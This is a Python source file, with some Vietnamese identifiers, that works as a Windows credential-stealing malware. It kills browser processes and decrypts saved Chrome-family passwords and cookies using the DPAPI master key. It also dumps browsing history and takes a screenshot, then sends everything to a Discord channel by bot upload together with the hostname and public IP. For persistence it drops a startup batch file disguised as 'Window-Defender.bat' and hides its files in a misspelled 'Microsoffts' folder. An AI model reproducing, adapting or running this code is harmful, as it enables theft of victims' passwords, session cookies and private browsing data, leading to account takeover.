import smtplib
import ssl,socket
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from win32 import win32crypt
import os,requests,pyscreeze,psutil
import sqlite3
import shutil
import base64
import ntpath
import json,time
from Crypto.Cipher import AES
from base64 import b64decode
import smtplib
import ssl
import datetime
def check_internet_connection():
  url = "http://google.com"
  timeout = 5
  try:
    requests.get(url, timeout=timeout)
    return False
  except (requests.ConnectionError, requests.Timeout) as exception:
    return True
def get_ip():
  """
  Lấy IP của người dùng.

  Returns:
    str: IP của người dùng.
  """
  response = requests.get("https://api.ipify.org/?format=json")
  if response.status_code == 200:
    data = response.json()
    return data["ip"]
  else:
    raise RuntimeError("Lỗi khi lấy IP.")
def sao_chep_tep(ten_tep, duong_dan_goc, duong_dan_dich):
  if str(os.path.isfile(duong_dan_dich+'\\APP.exe'))=='True':
                os.remove(duong_dan_dich+'\\APP.exe')
  else:
    with open(f'C:\\ProgramData\\Microsoffts\\APP.exe','a') as f:  
        f.write('NGUYEN NGOC TEP')                
        f.close()
  time.sleep(5)      
  duong_dan_tep_moi = os.path.join(duong_dan_dich, ten_tep)
  shutil.copy2(os.path.join(duong_dan_goc, ten_tep), duong_dan_tep_moi)
def get_year_month_day():
    now = datetime.datetime.now()    
    current_year = now.year
    current_month = now.month
    current_day = now.strftime("%A")
    
    return current_year, current_month, current_day
def get_all_filenames(directory):
  filenames = []
  for filename in os.listdir(directory):
    if os.path.isfile(os.path.join(directory, filename)):
      filenames.append(filename)
  return filenames
def get_all_filenames(directory):
  filenames = []
  for filename in os.listdir(directory):
    if os.path.isfile(os.path.join(directory, filename)):
      filenames.append(filename)
  return filenames
def sending(BOT_TOKEN,CHANNEL_ID,test,contents):
    files={}
    data={}
    files.update({"file": test})
    data.update({"content": contents})
    headers = {
        "Authorization": f"Bot {BOT_TOKEN}",
    }
    url = f"https://discordapp.com/api/v8/channels/{CHANNEL_ID}/messages"

    response = requests.post(url, headers=headers,files=files, data=data)  
def discord_bot_sending_attchement(BOT_TOKEN,CHANNEL_ID,filenames,directory):
    contents=''    
    current_year, current_month, current_day = get_year_month_day() 
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)   
    for i in filenames:
        test=open('C:\\ProgramData\\Microsoffts\\'+i,'rb')
        sending(BOT_TOKEN,CHANNEL_ID,test,contents)  
    test=''
    contents=f' Criminal - Scape Data AUTO FILl ,NETSCAPE AND PASSWORD {current_day}-{current_month}-{current_year} Hostname: {hostname} Local IP: {get_ip()}'
    sending(BOT_TOKEN,CHANNEL_ID,test,contents)          
    
def end_task_chrome():
    run_exe_file_names=(requests.get('https://raw.githubusercontent.com/David22092007/About-xyz-2007-coding-/main/run_exe_file_name').text).replace('[','').replace(']','').replace('\n','').replace('"','').split(',')
    for file_exe_run_chrom in run_exe_file_names:
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'] == file_exe_run_chrom:
                    pid = proc.info['pid'];os.system(f"taskkill /f /pid {pid}")
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
def screenshot():
    screenshot = pyscreeze.screenshot()
    pyscreeze.screenshot("C:\\ProgramData\\Microsoffts\\screenshot.png")
def find_file_location(filename):
    return os.path.abspath(filename)
def create_auto_run_bat():
    file_main_location=os.getcwd();check_folder = (os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"))+str('\\Window-Defender.bat')
    while os.path.isfile(check_folder):
        return None
    startup_folder = (os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"))
    os.chdir(startup_folder)
    with open("Window-Defender.bat", "w") as f:
        f.write('@echo off\n')
        f.write(f'cd "C:\\ProgramData\\Microsoffts'+'\n')
        f.write(f'start "svchost.exe" "C:\\ProgramData\\Microsoffts'+'\\APP.exe'+'"\n')
        f.close()
def w1nd0_dcr(encrypted_str: bytes) -> str:
    return win32crypt.CryptUnprotectData(encrypted_str, None, None, None, 0)[1]
def dcrpt_val(buff, master_key) -> str:
    global password
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}"'
def gtmk3y(path: str or os.PathLike):
    if not ntpath.exists(path):
        return None
    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)
    try:
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        return w1nd0_dcr(master_key[5:])
    except KeyError:
        return None   
def steal_chrome_cookies():
    password_data=[]
    #
    for browser_location in location:
        filename=browser_location.replace('/','')
        try:
            chrome_data_path = (os.path.expanduser(f"~/AppData/{browser_location}/User Data/Default/Network/Cookies"))
            temp_data_path = os.path.expanduser("~/chrome_login_data")
            if os.path.isfile(chrome_data_path)==False:
                win32crypt84()
            else:
                checkfile = (os.path.expanduser(f"C:\\ProgramData\\Microsoffts\\{filename}_netscape.txt"))
                if str(os.path.isfile(checkfile))=='False':
                    mode='a'
                else:
                    mode='w'
                with open(f'C:\\ProgramData\\Microsoffts\\{filename}_netscape.txt',mode) as f:   
                    shutil.copy2(chrome_data_path, temp_data_path)
                    conn = sqlite3.connect(temp_data_path)
                    cursor = conn.cursor()
                    masterkey = gtmk3y((os.path.expanduser(f"~\\AppData\\{browser_location}\\User Data\\Local State")).replace("\\","/"))  
                    for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
                        host_key, name, path, encrypted_value, expires_utc = res
                        value = dcrpt_val(encrypted_value, masterkey)
                        if host_key and name and value != "":
                            f.write((("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
                                host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))))
                cursor.close()
                conn.close()
                os.remove(temp_data_path)

        except Exception as e:
            None
    return password_data
def steal_chrome_passwords():
    password_data=[]
    #
    for browser_location in location:
        
        filename=browser_location.replace('/','')

        try:
            chrome_data_path = os.path.expanduser(f"~/AppData/{browser_location}/User Data/Default/Login Data")
            
            temp_data_path = os.path.expanduser("~/chrome_login_data")
            if os.path.isfile(chrome_data_path)==False:
                win32crypt84()
            else:
                checkfile = (os.path.expanduser(f'C:\\ProgramData\\Microsoffts\\{filename}_paassword.txt'))
                if str(os.path.isfile(checkfile))=='False':
                    mode='a'
                else:
                    mode='w'
                with open(f'C:\\ProgramData\\Microsoffts\\{filename}_paassword.txt',mode) as f:                
                    try:                                                                                                                      
                        shutil.copy2(chrome_data_path, temp_data_path)
                        conn = sqlite3.connect(temp_data_path)
                        cursor = conn.cursor()
                        masterkey = gtmk3y((os.path.expanduser(f"~\\AppData\\{browser_location}\\User Data\\Local State")).replace("\\","/"))  
                        for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                            url, username, password = res
                            password = dcrpt_val(password, masterkey)
                            res = url, username, password
                            f.write('URL :       '+str(res[0])+'       USERNAME :       '+str(res[1]) + '       PASSWORD :       '+str(res[2])+'\n')    
                        conn.close()
                        os.remove(temp_data_path)
                    except Exception as e:
                        None
                    
                    f.close()
        except Exception as e:
            None

def get_chrome_history_path(browser_location):
    history_path=os.path.expanduser(f"~/AppData/{browser_location}/User Data/Default/History")
    return history_path

def read_chrome_history():
    #
    for browser_location in location:
        try:
            filename=browser_location.replace('/','')
            history_path=get_chrome_history_path(browser_location)
            conn = sqlite3.connect(history_path)
            cursor = conn.cursor()
            sites = []
            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                url, title, visit_count, last_visit_time = res
                if url and title and visit_count and last_visit_time != "":
                    sites.append((url, title, visit_count, last_visit_time))
            sites.sort(key=lambda x: x[3], reverse=True)
            checkfile = (os.path.expanduser(f'C:\\ProgramData\\Microsoffts\\{filename}_history.txt'))
            if str(os.path.isfile(checkfile))=='False':
                mode='a'
            else:
                mode='w'
            with open(f'C:\\ProgramData\\Microsoffts\\{filename}_history.txt',mode) as f:
                for site in sites:
                    f.write ("Visit Count: {:<6} Title: {:<40}\n".format(site[0], site[2], site[3], site[1])+'\n')
                f.close()    
            history = cursor.fetchall()
            conn.close()
        except Exception as e:
            None
def tao_thu_muc(ten_thu_muc):
    #
  if os.path.isdir("C:\\ProgramData\\"+ten_thu_muc)==False:
      try:
        os.mkdir(os.path.join("C:\\ProgramData", ten_thu_muc))
        return True
      except OSError as err:
        return False

try:
    while check_internet_connection():
        None
except:
    None 
try:
    location=(requests.get('https://raw.githubusercontent.com/David22092007/About-xyz-2007-coding-/main/CHROME%20LOCATION').text).replace('[','').replace(']','').replace('\n','').replace('"','').split(',')
except:
    None
try:
    tao_thu_muc("Microsoffts")
except:
    None
try:
    file_main_location=(os.getcwd())+'\\'
    sao_chep_tep("APP.exe", file_main_location, f'C:\\ProgramData\\Microsoffts')
except Exception as e:
    None   
try:
    screenshot()
except Exception as e:
    None
try:
    end_task_chrome()
except Exception as e:
    None    
try:
    steal_chrome_passwords()
except:
    None

try:
    steal_chrome_cookies()
except:
    None
try:    
    read_chrome_history()
except:
    None
try: 
    BOT_TOKEN = ""
    CHANNEL_ID = "1223574101550043176"
    directory="C:\\ProgramData\\Microsoffts"   
    filenames = get_all_filenames(directory)
    discord_bot_sending_attchement(BOT_TOKEN,CHANNEL_ID,filenames,directory)
except Exception as e:
    None# (e)
try:
    create_auto_run_bat()
except:
    None
